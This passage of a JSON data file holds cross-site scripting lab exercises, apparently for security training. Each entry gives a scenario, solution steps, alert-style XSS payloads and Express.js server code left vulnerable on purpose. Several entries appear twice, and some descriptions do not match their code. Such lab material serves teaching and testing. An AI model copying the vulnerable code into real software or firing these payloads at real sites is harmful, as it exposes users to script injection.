    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; let users = [{ name: 'admin', bio: 'Hello' }]; app.use(bodyParser.urlencoded({ extended: true })); app.get('/', (req, res) => { let html = '<html><body><h1>Users</h1>'; users.forEach(u => { html += `<div><span title='${u.bio}'>${u.name}</span></div>`; }); html += `<form action='/add' method='POST'><input name='name'><input name='bio'><button>Add</button></form></body></html>`; res.send(html); }); app.post('/add', (req, res) => { users.push({ name: req.body.name, bio: req.body.bio }); res.redirect('/'); }); app.listen(port);"
  },
  {
    "Lab scenario": "Reflected XSS in Email Subscription Confirmation",
    "Lab Description": "When users subscribe to the newsletter, the system reflects their email in the confirmation message without encoding it properly, allowing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit the subscription confirmation page with a crafted `email` parameter.",
      "Observe the reflected email in the HTML content.",
      "Use a payload that executes JavaScript."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/confirm', (req, res) => { const email = req.query.email || 'user@example.com'; res.send(`<html><body><h2>Thanks for subscribing: ${email}</h2></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "DOM XSS in Profile Settings Preview",
    "Lab Description": "The application allows users to preview changes to their profile, including custom signatures. The signature is rendered inside innerHTML without sanitization, leading to DOM-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the profile preview page.",
      "Insert a malicious payload into the preview input field.",
      "Trigger JavaScript execution via innerHTML injection."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/preview', (req, res) => { res.send(`<html><body><h2>Profile Preview</h2><form><input id='sig' placeholder='Signature'><button onclick='event.preventDefault();document.getElementById(\"view\").innerHTML=document.getElementById(\"sig\").value;'>Preview</button></form><div id='view'></div></body></html>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "XSS in Announcement Banner from Admin Panel",
    "Lab Description": "The admin panel allows adding an announcement banner. Content entered is saved and injected directly into the homepage without sanitization, enabling stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access the announcement feature and insert a payload in the announcement message.",
      "Visit the homepage and check the banner content.",
      "Confirm that JavaScript executes when the page loads."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; let banner = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/', (req, res) => { res.send(`<html><body><div class='banner'>${banner}</div><h1>Home</h1></body></html>`); }); app.get('/admin', (req, res) => { res.send(`<form method='POST'><input name='banner'><button>Update</button></form>`); }); app.post('/admin', (req, res) => { banner = req.body.banner; res.redirect('/'); }); app.listen(port);"
  },
  {
    "Lab scenario": "Online Course Platform Stored XSS in Assignment Feedback",
    "Lab Description": "The application allows instructors to leave feedback on student assignments. This feedback is rendered inside an HTML template without sanitization. The feedback field directly renders stored content, leading to stored XSS. To solve: Craft and submit a feedback entry that triggers JavaScript execution when a student views the assignment.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as an instructor and access the feedback form on a student's submission.",
      "Inject an XSS payload into the feedback textarea.",
      "Submit the feedback and logout.",
      "Login as the student and navigate to the assignment view page.",
      "Observe script execution upon viewing the feedback."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedbacks = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/submit-feedback', (req, res) => { res.send('<form method=\"POST\"><textarea name=\"feedback\"></textarea><button type=\"submit\">Submit</button></form>'); }); app.post('/submit-feedback', (req, res) => { feedbacks['student1'] = req.body.feedback; res.redirect('/view-assignment'); }); app.get('/view-assignment', (req, res) => { const feedback = feedbacks['student1'] || 'No feedback yet'; res.send(`<html><body><h1>Assignment</h1><div>${feedback}</div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Custom Tooltip Renderer of CRM Application",
    "Lab Description": "The CRM system renders tooltips with dynamic content from query parameters. The tooltip content is directly injected into a JavaScript handler that updates innerHTML, introducing a DOM-based XSS vector. To solve: Inject a payload into the tooltip parameter that leads to JavaScript execution when hovering over a contact name.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open a contact page and observe the tooltip behavior.",
      "Modify the 'tooltip' query parameter to inject malicious HTML.",
      "Craft a payload that breaks the JS context and appends script.",
      "Hover over the contact to trigger the script.",
      "Confirm alert execution."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<div onclick=alert(1)>hover</div>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/contact', (req, res) => { const tooltip = req.query.tooltip || 'User Info'; res.send(`<html><body><h2 onmouseover=\"document.getElementById('tip').innerHTML='${tooltip}'\">Contact Name</h2><div id='tip'></div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Project Management Chat Mention Renderer",
    "Lab Description": "A project management tool parses mentions (e.g. @username) from chat messages and renders them as HTML. The parser fails to sanitize HTML tags embedded in usernames, enabling XSS through crafted mentions. To solve: Inject a mention that breaks out of the renderer logic and executes JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a chat message with a malicious mention payload.",
      "Craft the mention to break the rendering logic and inject script.",
      "Observe rendering in the chat window.",
      "Trigger payload execution.",
      "Confirm XSS on affected message view."
    ],
    "payloads": [
      "@<img src=x onerror=alert(1)>",
      "@<svg/onload=alert(1)>",
      "@<iframe src=javascript:alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/chat', (req, res) => { const rendered = messages.map(m => m.replace(/@\\w+/g, u => `<b>${u}</b>`)).join('<br>'); res.send(`<form method='POST'><input name='msg'><button>Send</button></form>${rendered}`); }); app.post('/chat', (req, res) => { messages.push(req.body.msg); res.redirect('/chat'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Product Q&A Module of E-Commerce Platform",
    "Lab Description": "The e-commerce product page includes a Q&A section where users can submit questions. The submitted content is rendered in HTML without encoding. This allows attackers to submit script payloads which are then displayed to future users. To solve: Inject an XSS payload in a new question and trigger it by revisiting the product page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to a product page and submit a new question.",
      "Include a JavaScript payload in the question text.",
      "Reload the product page and view the Q&A section.",
      "Verify script execution.",
      "Confirm stored XSS behavior."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const questions = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/product', (req, res) => { const qList = questions.map(q => `<li>${q}</li>`).join(''); res.send(`<form method='POST'><input name='question'><button>Ask</button></form><ul>${qList}</ul>`); }); app.post('/product', (req, res) => { questions.push(req.body.question); res.redirect('/product'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS in Image Gallery Preview Generator",
    "Lab Description": "The image gallery application generates preview content using a hash value in the URL. The hash is parsed and injected into the DOM using innerHTML without validation. To solve: Manipulate the hash value in the URL to inject an XSS payload that executes JavaScript in the context of the gallery.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the gallery and observe the use of location.hash.",
      "Modify the URL hash with a malicious HTML snippet.",
      "Inject script via the hash fragment.",
      "Confirm execution on page load.",
      "Verify DOM XSS via innerHTML usage."
    ],
    "payloads": [
      "#<img src=x onerror=alert(1)>",
      "#<svg/onload=alert(1)>",
      "#<iframe src=javascript:alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/', (req, res) => { res.send(`<html><body><h1>Gallery</h1><div id='preview'></div><script>document.getElementById('preview').innerHTML = location.hash.substring(1);</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Profile Update XSS via Avatar URL in Gaming Community",
    "Lab Description": "The application allows users to update their profile including avatar image URL. The backend does not validate the URL format and embeds it directly into an <img> tag, enabling XSS via crafted image URLs. To solve: Inject a malicious image source that executes JavaScript when rendered.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in and navigate to the profile update page.",
      "Submit an avatar URL with a JavaScript-based payload.",
      "View the updated profile page where the avatar is rendered.",
      "Observe that the avatar loads from the injected payload and executes script.",
      "Confirm the payload successfully triggers in the profile display context."
    ],
    "payloads": [
      "javascript:alert(1)",
      "data:image/svg+xml,<svg/onload=alert(1)>",
      "x\" onerror=\"alert(1)"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let profile = { username: 'gamer123', avatar: 'https://cdn.example.com/default.png' }; app.get('/profile', (req, res) => { res.send(`<html><body><h1>${profile.username}</h1><img src=\"${profile.avatar}\"><form action='/update' method='POST'><input name='avatar'><button>Update</button></form></body></html>`); }); app.post('/update', (req, res) => { profile.avatar = req.body.avatar; res.redirect('/profile'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Support Chat via Hidden HTML Injection",
    "Lab Description": "A support chat widget stores and reflects recent messages without sanitization. HTML tags are allowed to style messages but scripts are not filtered effectively. To solve: Inject a hidden script that triggers when a staff member views chat history.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open the live chat interface and send a crafted message with HTML.",
      "Inject a payload into a support message that includes hidden JavaScript.",
      "Wait for the staff dashboard to load the stored chat messages.",
      "The injected payload executes when the support view is rendered.",
      "Verify XSS via alert box or payload callback."
    ],
    "payloads": [
      "<div style='display:none'><img src=x onerror=alert(1)></div>",
      "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
      "<object data='javascript:alert(1)'></object>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/chat', (req, res) => { let history = messages.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${history}<form method='POST'><input name='msg'><button>Send</button></form></body></html>`); }); app.post('/chat', (req, res) => { messages.push(req.body.msg); res.redirect('/chat'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Tag Suggestions Feature via JSON Injection",
    "Lab Description": "The blog platform provides real-time tag suggestions. A user's custom tag input is embedded in a JavaScript array without escaping, causing JSON context injection. To solve: Inject a payload that breaks out of the array and executes JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to the new post creation page and begin typing a custom tag.",
      "Observe the response contains your tag inside a JavaScript array.",
      "Inject a payload that breaks the context and appends a script.",
      "Use browser developer tools or Burp Suite to observe raw JS response.",
      "Verify script execution on the client side when suggestions render."
    ],
    "payloads": [
      "test\",\"<img src=x onerror=alert(1)>",
      "x\"]};alert(1);//",
      "foo\",\"<script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/tags', (req, res) => { const q = req.query.q || ''; res.send(`<script>let suggestions = [\"${q}\"];</script>`); }); app.listen(port);"
  },
  {
    "Lab scenario": "Embedded Poll Widget XSS in News Portal",
    "Lab Description": "The news website embeds a poll widget that reflects the poll question in HTML. The question text comes from a GET parameter, which is inserted without sanitization. To solve: Inject an HTML-breaking payload that leads to script execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Craft a URL with a malicious poll question parameter.",
      "Visit the widget page with the payload in the query string.",
      "Observe the payload rendered directly in HTML context.",
      "The payload breaks the structure and triggers script execution.",
      "Confirm via visible alert or payload effect."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/poll', (req, res) => { const question = req.query.q || 'Do you like this article?'; res.send(`<html><body><h2>${question}</h2><button>Yes</button><button>No</button></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Markdown Preview XSS via Link Rendering",
    "Lab Description": "A markdown editor allows users to preview their formatted content. Links are rendered as HTML <a> tags without validating the href, enabling JavaScript URIs to be injected. To solve: Inject a markdown link with JavaScript URI and trigger XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to the markdown editor preview page.",
      "Enter a markdown-formatted link with a malicious href.",
      "Click preview and observe the generated link.",
      "Click the link or inspect the DOM to trigger the XSS.",
      "Confirm execution through alert or redirect."
    ],
    "payloads": [
      "[Click](javascript:alert(1))",
      "[x](data:text/html,<script>alert(1)</script>)",
      "[a](javascript:confirm(1))"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const md = require('markdown-it')(); app.post('/preview', (req, res) => { const html = md.render(req.body.content); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "User Comment System XSS via Unfiltered Input in Forum Post",
    "Lab Description": "A community forum allows users to post comments under articles. The submitted comment content is rendered on the page without proper HTML sanitization. To solve: Inject a script in the comment field and confirm it runs when viewed.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to a forum article and locate the comment form.",
      "Submit a comment containing an XSS payload.",
      "Reload the article page and locate your comment.",
      "Observe that the payload is rendered and executed.",
      "Verify the XSS was triggered through an alert or JavaScript behavior."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/article', (req, res) => { const commentHTML = comments.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body><h1>Forum Article</h1>${commentHTML}<form method='POST' action='/comment'><input name='text'><button>Post</button></form></body></html>`); }); app.post('/comment', (req, res) => { comments.push(req.body.text); res.redirect('/article'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Search Result Page XSS via Reflected Query Parameter",
    "Lab Description": "The search functionality on the travel website displays the query term directly on the results page without encoding. This allows attackers to inject JavaScript through the search parameter. To solve: Inject a script in the query parameter and confirm execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit the search page with a crafted query string.",
      "Use an XSS payload in the query to manipulate the DOM.",
      "Observe the results page where the query is reflected unsanitized.",
      "Check whether the script executes immediately on page load.",
      "Verify XSS execution with an alert or triggered behavior."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><h1>Search Results for ${q}</h1><div>No results found.</div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Custom Greeting Card Preview via Template Injection",
    "Lab Description": "An online greeting card maker allows users to preview a card with a custom message. The message is inserted into the HTML using template literals without escaping, allowing DOM-based XSS. To solve: Inject a payload into the message to break out of the template and execute JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to the card creation form and input a crafted message.",
      "Submit and preview the card using the provided preview button.",
      "Inspect the page and find the injected message in a script context.",
      "Trigger and confirm execution of the payload.",
      "Verify the XSS using an alert or action."
    ],
    "payloads": [
      "`;alert(1)//",
      "';alert(1)//",
      "\";alert(1)//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/preview', (req, res) => { const msg = req.query.msg || 'Happy Birthday!'; res.send(`<html><head><script>let message = \"${msg}\";</script></head><body><h1>Greeting Card</h1></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Helpdesk Ticket Viewer via Subject Reflection",
    "Lab Description": "The helpdesk interface displays the subject of a ticket by reflecting a query parameter directly in HTML. No encoding or escaping is applied. To solve: Inject a script into the subject and trigger XSS on the ticket view page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the ticket viewer page using a subject query.",
      "Insert a payload into the subject parameter.",
      "Observe the reflected subject in HTML on the page.",
      "Confirm the script execution when the page loads.",
      "Verify via alert or other visible result."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/ticket', (req, res) => { const subject = req.query.subject || 'Support Inquiry'; res.send(`<html><body><h2>${subject}</h2><div>Your ticket will be reviewed shortly.</div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Notification Dropdown via Stored Alert Text",
    "Lab Description": "The web app stores notification alerts entered by users, such as system warnings or admin announcements. When rendering, the alert text is inserted into a dropdown using innerHTML, allowing stored XSS. To solve: Inject a malicious string into the alert and trigger it when the dropdown is rendered.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a crafted alert string using the notification input.",
      "Wait for a user or admin to view the notification dropdown.",
      "Observe the payload being injected via innerHTML.",
      "Trigger the dropdown to render the script.",
      "Verify execution with an alert or behavior."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert(1)</script>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let notifications = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/admin', (req, res) => { const notifHTML = notifications.map(n => `<li>${n}</li>`).join(''); res.send(`<html><body><ul id='dropdown'>${notifHTML}</ul><form method='POST'><input name='n'><button>Add</button></form></body></html>`); }); app.post('/admin', (req, res) => { notifications.push(req.body.n); res.redirect('/admin'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Image Caption Injection in Photography Portfolio",
    "Lab Description": "A photography site allows photographers to submit captions for their images. These captions are rendered in the gallery without HTML escaping. This allows an attacker to inject HTML or scripts into the gallery view. To solve: Inject a payload as a caption and verify it executes in the gallery.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the image submission form and upload a photo with a crafted caption.",
      "Navigate to the public gallery where captions are displayed.",
      "Observe the caption rendered directly into the HTML.",
      "Trigger the payload on image render.",
      "Verify XSS via alert or DOM manipulation."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let gallery = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/gallery', (req, res) => { const imgs = gallery.map(g => `<figure><img src='${g.url}'><figcaption>${g.caption}</figcaption></figure>`).join(''); res.send(`<html><body><h1>Photo Gallery</h1>${imgs}<form method='POST'><input name='url'><input name='caption'><button>Submit</button></form></body></html>`); }); app.post('/gallery', (req, res) => { gallery.push({ url: req.body.url, caption: req.body.caption }); res.redirect('/gallery'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in FAQ Accordion via Question Parameter",
    "Lab Description": "An FAQ section loads question data dynamically based on a query parameter and reflects it inside expandable accordion elements. The input is not sanitized before being injected into the HTML, enabling DOM-based XSS. To solve: Inject a script via the question parameter and trigger it when the accordion renders.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to the FAQ page with a crafted `q` parameter.",
      "Inject a payload into the parameter targeting script execution.",
      "Observe the reflected unsanitized HTML in the accordion block.",
      "Expand the accordion to trigger DOM parsing.",
      "Confirm XSS with a script execution."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<svg onload=alert(1)>",
      "\"onmouseover=alert(1) autofocus"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/faq', (req, res) => { const q = req.query.q || 'How to reset password?'; res.send(`<html><body><h1>FAQs</h1><div class='accordion'><div class='question'>${q}</div><div class='answer'>Please follow the steps to reset your password.</div></div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Feedback Summary on Admin Dashboard",
    "Lab Description": "A user feedback form collects input and stores it in a database. The admin dashboard displays recent feedback using innerHTML without encoding. Attackers can submit malicious input that is rendered when the admin views the dashboard. To solve: Submit a payload as feedback and trigger stored XSS on admin view.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a feedback form with a crafted payload in the text field.",
      "Access the admin dashboard that lists feedback messages.",
      "Observe the feedback being injected using innerHTML.",
      "Wait for an admin to view the feedback section.",
      "Confirm the payload executes upon page load."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let feedbacks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/admin/dashboard', (req, res) => { const content = feedbacks.map(f => `<p>${f}</p>`).join(''); res.send(`<html><body><h1>Feedback</h1>${content}</body></html>`); }); app.post('/submit-feedback', (req, res) => { feedbacks.push(req.body.msg); res.redirect('/'); }); app.get('/', (req, res) => { res.send(`<form method='POST' action='/submit-feedback'><textarea name='msg'></textarea><button>Send</button></form>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in User Badge Description Field on Profile Page",
    "Lab Description": "Users can earn badges and set custom badge descriptions. These descriptions are rendered directly in profile pages using dangerouslySetInnerHTML. Without proper validation, this leads to stored XSS. To solve: Submit a badge description with an XSS payload and view it from another profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set a custom badge description via profile settings.",
      "Inject a crafted payload into the badge description field.",
      "View the public-facing profile page where the description is shown.",
      "Observe unsafe rendering of the HTML content.",
      "Verify execution of the JavaScript payload."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let badgeDesc = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/profile', (req, res) => { const user = req.query.user || 'guest'; const desc = badgeDesc[user] || 'No badge yet.'; res.send(`<html><body><h1>${user}'s Profile</h1><div class='badge'>${desc}</div></body></html>`); }); app.post('/set-badge', (req, res) => { badgeDesc[req.body.user] = req.body.desc; res.redirect(`/profile?user=${req.body.user}`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Admin Announcement Viewer via Stored HTML",
    "Lab Description": "An announcement management system allows admin users to post messages containing HTML. The messages are stored and later rendered to all users. Since there's no sanitization, stored XSS is possible. To solve: Submit a malicious announcement and verify execution on user view.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit an admin announcement with a script payload.",
      "Wait for users to view the announcement page.",
      "Observe that the announcement content is rendered raw.",
      "Trigger the payload during page load.",
      "Verify JavaScript execution to confirm XSS."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let announcements = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/announcements', (req, res) => { const list = announcements.map(a => `<div>${a}</div>`).join(''); res.send(`<html><body><h1>Announcements</h1>${list}</body></html>`); }); app.post('/admin/announce', (req, res) => { announcements.push(req.body.content); res.redirect('/announcements'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Image Caption Injection in Photography Portfolio",
    "Lab Description": "A photography site allows photographers to submit captions for their images. These captions are rendered in the gallery without HTML escaping. This allows an attacker to inject HTML or scripts into the gallery view. To solve: Inject a payload as a caption and verify it executes in the gallery.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the image submission form and upload a photo with a crafted caption.",
      "Navigate to the public gallery where captions are displayed.",
      "Observe the caption rendered directly into the HTML.",
      "Trigger the payload on image render.",
      "Verify XSS via alert or DOM manipulation."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let gallery = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/gallery', (req, res) => { const imgs = gallery.map(g => `<figure><img src='${g.url}'><figcaption>${g.caption}</figcaption></figure>`).join(''); res.send(`<html><body><h1>Photo Gallery</h1>${imgs}<form method='POST'><input name='url'><input name='caption'><button>Submit</button></form></body></html>`); }); app.post('/gallery', (req, res) => { gallery.push({ url: req.body.url, caption: req.body.caption }); res.redirect('/gallery'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in FAQ Accordion via Question Parameter",
    "Lab Description": "An FAQ section loads question data dynamically based on a query parameter and reflects it inside expandable accordion elements. The input is not sanitized before being injected into the HTML, enabling DOM-based XSS. To solve: Inject a script via the question parameter and trigger it when the accordion renders.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to the FAQ page with a crafted `q` parameter.",
      "Inject a payload into the parameter targeting script execution.",
      "Observe the reflected unsanitized HTML in the accordion block.",
      "Expand the accordion to trigger DOM parsing.",
      "Confirm XSS with a script execution."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<svg onload=alert(1)>",
      "\"onmouseover=alert(1) autofocus"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/faq', (req, res) => { const q = req.query.q || 'How to reset password?'; res.send(`<html><body><h1>FAQs</h1><div class='accordion'><div class='question'>${q}</div><div class='answer'>Please follow the steps to reset your password.</div></div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Feedback Summary on Admin Dashboard",
    "Lab Description": "A user feedback form collects input and stores it in a database. The admin dashboard displays recent feedback using innerHTML without encoding. Attackers can submit malicious input that is rendered when the admin views the dashboard. To solve: Submit a payload as feedback and trigger stored XSS on admin view.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a feedback form with a crafted payload in the text field.",
      "Access the admin dashboard that lists feedback messages.",
      "Observe the feedback being injected using innerHTML.",
      "Wait for an admin to view the feedback section.",
      "Confirm the payload executes upon page load."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let feedbacks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/admin/dashboard', (req, res) => { const content = feedbacks.map(f => `<p>${f}</p>`).join(''); res.send(`<html><body><h1>Feedback</h1>${content}</body></html>`); }); app.post('/submit-feedback', (req, res) => { feedbacks.push(req.body.msg); res.redirect('/'); }); app.get('/', (req, res) => { res.send(`<form method='POST' action='/submit-feedback'><textarea name='msg'></textarea><button>Send</button></form>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in User Badge Description Field on Profile Page",
    "Lab Description": "Users can earn badges and set custom badge descriptions. These descriptions are rendered directly in profile pages using dangerouslySetInnerHTML. Without proper validation, this leads to stored XSS. To solve: Submit a badge description with an XSS payload and view it from another profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set a custom badge description via profile settings.",
      "Inject a crafted payload into the badge description field.",
      "View the public-facing profile page where the description is shown.",
      "Observe unsafe rendering of the HTML content.",
      "Verify execution of the JavaScript payload."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let badgeDesc = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/profile', (req, res) => { const user = req.query.user || 'guest'; const desc = badgeDesc[user] || 'No badge yet.'; res.send(`<html><body><h1>${user}'s Profile</h1><div class='badge'>${desc}</div></body></html>`); }); app.post('/set-badge', (req, res) => { badgeDesc[req.body.user] = req.body.desc; res.redirect(`/profile?user=${req.body.user}`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Admin Announcement Viewer via Stored HTML",
    "Lab Description": "An announcement management system allows admin users to post messages containing HTML. The messages are stored and later rendered to all users. Since there's no sanitization, stored XSS is possible. To solve: Submit a malicious announcement and verify execution on user view.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit an admin announcement with a script payload.",
      "Wait for users to view the announcement page.",
      "Observe that the announcement content is rendered raw.",
      "Trigger the payload during page load.",
      "Verify JavaScript execution to confirm XSS."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
